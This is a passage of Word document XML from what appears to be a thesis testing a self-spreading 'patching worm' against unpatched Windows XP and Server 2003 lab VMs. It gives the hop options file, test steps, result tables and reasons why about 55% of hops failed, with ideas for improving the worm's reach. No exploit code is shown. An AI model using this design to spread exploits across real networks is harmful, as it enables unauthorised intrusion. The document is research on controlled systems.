      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>192.168.0.153</w:t>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b/>
        <w:t>etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00E65C50">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>
        <w:mirrorIndents/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>… (continues all the way to 187 for a total of 38 target IPs)</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When the worm is copied to the next hop the target will receive an updated version of this options file:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00D6250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D62508">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>The “previous parent” IP updated with the exploiting nodes IP address (previous hop)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D6149"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D62508">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The exploiting nodes timestamp</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00D62508" w:rsidRDefault="00CB26A3" w:rsidP="008D6149">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D62508">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(for reference to next hop in case of system clock differences)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00D6250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D62508">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The original seed IP or ID (always the same for all hops)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00D6250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D62508">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The updated target list with all attempted target IPs by the previous hop removed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="48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The worm runs hop-to-hop with only 1 instance (hop) attempting exploits at any time</w:t>
      </w:r>
      <w:r w:rsidR="00A0593B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00695A08">
      <w:pPr>
        <w:pStyle w:val="TH2"/>
      </w:pPr>
      <w:bookmarkStart w:id="33" w:name="_Toc321736802"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Steps to run test:</w:t>
      </w:r>
      <w:bookmarkEnd w:id="33"/>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Revert all test VMs to clean snapshot before worm was run and OS is still unpatched</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Execute worm from seed VM</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Once worm has finished executing collect logs from all VMs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A13CD1"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“C:\Users\Administrator\AppData\Roaming\ThesisWorm” on seed VM</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A13CD1"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w:t>
      </w:r>
      <w:r w:rsidR="00856A1E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="00A13CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:\Windows\system32\config\systemprofile\ThesisWorm” on test (target) VMs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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 xml:space="preserve">On VMs where worm did </w:t>
      </w:r>
      <w:r w:rsidR="00A13CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not run no logs are available</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A13CD1" w:rsidRDefault="00A13CD1" w:rsidP="00A13CD1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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CB26A3" w:rsidRPr="00A13CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>og from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00A13C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 VM node in the hop chain that attempted to exploit the target will mention this.</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Manually verify that non-vulnerable VMs did not crash</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A13CD1"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Review of Event Viewer system log provides this information</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Remotely reboot exploited test VMs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A13CD1"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This applies the OS update which requires a reboot to take effect</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 xml:space="preserve">Run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00A13CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A13CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> framework</w:t>
      </w:r>
      <w:r w:rsidRPr="00A13CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit against expected vulnerable systems</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A13CD1"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Verify that test VMs expected to be patched were not exploited again</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00A13CD1"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A13CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>If any are exploited again it would indicate that the worm failed to patch the system</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00695A08">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc321736803"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Test Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00365A5F"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following data is given in the tables below for each test iteration:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000F0635"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Total Targets (existent and non-existent) - The configured number of target IP addresses</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00365A5F" w:rsidRDefault="001539EB" w:rsidP="000F0635">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3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B26A3" w:rsidRPr="00365A5F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hether a target ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>isted or not on that IP address</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Total Existent Targets - The number of actual existing targets in Total Targets</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Expected Exploited - How many targets are expected to be exploited and run the worm</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Actual Exploited - How many targets actually were exploited and ran the worm</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Expected Patched by Worm - How many targets should be patched by the worm</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Actual Patched by Worm - How many targets were actually patched by the worm</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 xml:space="preserve">Expected Unaffected - How many targets were expected to not be exploited </w:t>
      </w:r>
      <w:r w:rsidR="00022F77">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>by</w:t>
      </w:r>
      <w:r w:rsidRPr="00365A5F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the worm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00365A5F" w:rsidRDefault="00CB26A3" w:rsidP="005D653F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>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This is for “Total Existent Targets”</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Actual Unaffected - How many targets were actually not exploited nor ran the worm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00365A5F"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365A5F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Actual Crash - How many targets crashed as a result of the worm</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00553991" w:rsidRPr="00553991" w:rsidRDefault="00553991" w:rsidP="00553991">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc321730221"/>
      <w:r w:rsidRPr="00553991">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00553991">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00553991">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00553991">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00553991">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00553991">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: First Iteration</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AE05C3" w:rsidTr="00AE05C3">
        <w:trPr>
          <w:trHeight w:val="509"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4225" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRPr="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Total Targets (existent and non-existent)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>38</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Total Existent Targets</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>34</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Expected Exploitable</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>27</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Actual Exploited</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>15</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Expected Patched by Worm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>26</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Actual Patched by Worm</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>15</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Expected Unaffected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>7</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Actual Unaffected</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>19</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t>Actual Crash</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE05C3" w:rsidTr="00AE05C3">
        <w:trPr>
          <w:trHeight w:val="509"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4225" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Run Time (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>min:sec</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="775" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00AE05C3" w:rsidRDefault="00AE05C3">
            <w:pPr>
              <w:jc w:val="right"/>
            </w:pPr>
            <w:r>
              <w:t>15:14</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0035587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There were 4 non-existent IPs used in the test to simulate the worm having to try a target, fail to reach it, and continue on with the next.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0035587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The worm has a patch for Windows XP 32-bit which </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>had 26 VM instances</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  The exploit also works for Windows Server 2003 32-bit hence the 27 “Expected Exploitable” targets.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="0035587C"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Interesting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> note is that ~55% of the expected vulnerable VMs were not successfully exploited.  The worm logs indicate that a successful hop could not be made because the target actively refused a connection on the exploit handler port (port 4444).  The exploit payload was successfully delivered to the machine on port 135, but for an indeterminable reason the machine didn’t listen on the expected port.  This is a great representation of the difficulties encountered in real-world networks.  Even though the VMs were exact clones of each other with the exact same configurations (excepting hostname, MAC, and IP address) there were still issues with the exploit successfully working as expected.  Even though it was successful on other hops these unexpected hop results sh</w:t>
      </w:r>
      <w:r w:rsidR="00F06CD1">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ow that unknown conditions can a</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ffect the worm.  Some possible reasons would be that the machine was responding more slowly in CPU performance and/or network performance.  This could cause the worm to attempt to connect too soon before the target was ready.  The worm implementation only attempts the connection once and assumes failure if it doesn’t succeed.  In addition after delivering the payload the worm waits 1 second before attempting to copy itself over to the target to allow for the target to load the remote loader handler.  Some possible solutions would be to have the worm retry the exploit and wait even longer when retrying for slower hosts.  It depends on the amount of certainty desired in reaching </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>all possible nodes in the shortest time.  However, this problem of missed nodes could also occur with mobile users who disconnect or with machines that were powered off at the time the worm was spreading.  One possible solution is to simply execute the worm multiple times on the network at various parts of the day or week to catch missed nodes.  Any nodes during a previous run that were reached would have been patched and thus ignored in subsequent runs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A50F90" w:rsidRPr="00A50F90" w:rsidRDefault="00A50F90" w:rsidP="00A50F90">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:keepNext/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc321730222"/>
      <w:r w:rsidRPr="00A50F90">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Table </w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00A50F90">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00A50F90">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> SEQ Table \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00A50F90">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00987FD3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="009349AB" w:rsidRPr="00A50F90">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00A50F90">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: Second Iteration</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A50F90" w:rsidTr="002172F1">
        <w:trPr>
          <w:trHeight w:val="509"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4225" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:noWrap/>
            <w:vAlign w:val="bottom"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w:rsidR="00A50F90" w:rsidRPr="00AE05C3" w:rsidRDefault="00A50F90" w:rsidP="002172F1">
